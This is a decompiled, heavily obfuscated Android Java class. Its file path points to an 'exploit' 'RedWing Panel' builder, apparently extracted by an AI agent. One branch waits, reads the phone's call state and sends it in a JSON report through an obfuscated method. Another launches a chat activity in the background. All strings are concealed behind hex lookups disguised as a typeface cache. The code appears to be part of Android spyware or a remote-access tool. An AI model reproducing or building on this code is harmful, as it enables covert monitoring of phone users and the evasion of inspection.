package v.s;

import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import app.mobilex.plus.ChatActivity;
import app.mobilex.plus.util.TypefaceCache;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final /* synthetic */ class m7Tosu6RfY5Ca6 implements Runnable {
    public final /* synthetic */ String JXn4Qf7zpnLjP5;
    public final /* synthetic */ RWY6BVSB0XxPbw vekpFI4d1Nc4fakF;
    public final /* synthetic */ int w9sT1Swbhx3hs;

    public /* synthetic */ m7Tosu6RfY5Ca6(RWY6BVSB0XxPbw rWY6BVSB0XxPbw, String str, int i) {
        this.w9sT1Swbhx3hs = i;
        this.vekpFI4d1Nc4fakF = rWY6BVSB0XxPbw;
        this.JXn4Qf7zpnLjP5 = str;
    }

    @Override // java.lang.Runnable
    public final void run() {
        switch (this.w9sT1Swbhx3hs) {
            case 0:
                RWY6BVSB0XxPbw rWY6BVSB0XxPbw = this.vekpFI4d1Nc4fakF;
                if (rWY6BVSB0XxPbw.ibVTtJUNfrGYbW && !rWY6BVSB0XxPbw.xDyLpEZyrcKVe0) {
                    rWY6BVSB0XxPbw.ibVTtJUNfrGYbW(this.JXn4Qf7zpnLjP5);
                    break;
                }
                break;
            case 1:
                RWY6BVSB0XxPbw rWY6BVSB0XxPbw2 = this.vekpFI4d1Nc4fakF;
                String str = this.JXn4Qf7zpnLjP5;
                try {
                    Thread.sleep(3000L);
                    Object systemService = rWY6BVSB0XxPbw2.dDIMxZXP1V8HdM.getSystemService("phone");
                    TelephonyManager telephonyManager = systemService instanceof TelephonyManager ? (TelephonyManager) systemService : null;
                    int callState = telephonyManager != null ? telephonyManager.getCallState() : 0;
                    boolean z = callState == 2;
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002000770057008B00CF00AC00C600A6003700630048"));
                    jSONObject.put(TypefaceCache.obtain("002D00630056008500F500AD"), str);
                    jSONObject.put(TypefaceCache.obtain("00220075004F008E00E600BA"), z);
                    jSONObject.put(TypefaceCache.obtain("002000770057008B00CF00AC00C600A600370073"), callState);
                    rWY6BVSB0XxPbw2.H9XlUr4OeMJFiXK(jSONObject);
                } catch (Exception unused) {
                    return;
                }
                break;
            case 2:
                String str2 = this.JXn4Qf7zpnLjP5;
                Context context = this.vekpFI4d1Nc4fakF.dDIMxZXP1V8HdM;
                try {
                    Intent intent = new Intent(context, (Class<?>) ChatActivity.class);
                    intent.addFlags(268435456);
                    intent.putExtra(TypefaceCache.obtain("002E00730048009400F100B800D7"), str2);
                    context.startActivity(intent);
                } catch (Exception e) {
                    TypefaceCache.obtain("000500770052008B00F500BB009200B3002C00360054009700F500B100920084002B0077004F00A600F300AB00DB00B1002A0062004200DD00B0");
                    e.getMessage();
                    return;
                }
                break;
            default:
                RWY6BVSB0XxPbw rWY6BVSB0XxPbw3 = this.vekpFI4d1Nc4fakF;
                String str3 = this.JXn4Qf7zpnLjP5;
                try {
                    J1m0XraSkScfWFMIlTC j1m0XraSkScfWFMIlTC = rWY6BVSB0XxPbw3.vekpFI4d1Nc4fakF;
                    if (j1m0XraSkScfWFMIlTC != null) {
                        j1m0XraSkScfWFMIlTC.b1EoSIRjJHO5(str3);
                    }
                } catch (Exception e2) {
                    TypefaceCache.obtain("001000730055008300B000BA00C000B5002C0064001B00CF00FF00B900D400AB002C0077005F008200F400F6008800E7");
                    e2.getMessage();
                }
                break;
        }
    }
}
